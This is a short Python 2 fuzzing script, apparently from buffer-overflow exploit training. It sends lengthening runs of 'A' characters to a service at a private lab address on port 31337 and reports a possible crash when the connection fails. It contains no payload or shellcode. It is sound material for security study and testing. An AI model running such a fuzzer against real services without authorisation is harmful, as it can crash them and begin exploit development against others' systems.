#!/usr/bin/python
import sys,socket
import time
 
address = '192.168.1.8'
port = 31337
buffer = ['A']
counter = 100
while len(buffer) < 10:
 buffer.append('A'*counter)
 counter=counter+100
try:
 for string in buffer:
  print '[+] Sending %s bytes...' % len(string)
  s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
  connect=s.connect((address,port))
  s.send(string + '\r\n')
  s.recv(1024)
  print '[+] Done'
except:
  print '[!] Unable to connect to the application. You may have crashed it.'
  sys.exit(0)
finally:
 s.close()